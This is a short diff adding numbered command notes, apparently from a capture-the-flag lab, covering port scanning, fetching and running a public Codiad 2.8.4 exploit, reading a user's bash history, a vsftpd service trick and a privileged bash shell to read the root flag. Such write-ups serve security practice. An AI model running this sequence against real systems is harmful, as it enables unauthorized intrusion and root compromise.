@@ -1,0 +1,13 @@
+1 - nmap -A -p- 10.10.112.176
+2 - ftp 10.10.112.176
+3 - http://10.10.112.176:62337/
+4 - searchsploit "codiad 2.8.4"
+5 - searchsploit -m 49907
+6 - python3 49907.py
+7 - cat /home/drac/.bash_history
+8 - sudo -l
+9 - sudo /usr/sbin/service vsftpd restart
+10 - systemctl daemon-reload
+11 - sudo /usr/sbin/service vsftpd restart
+12 - /bin/bash -p
+13 - cat /root/root.txt
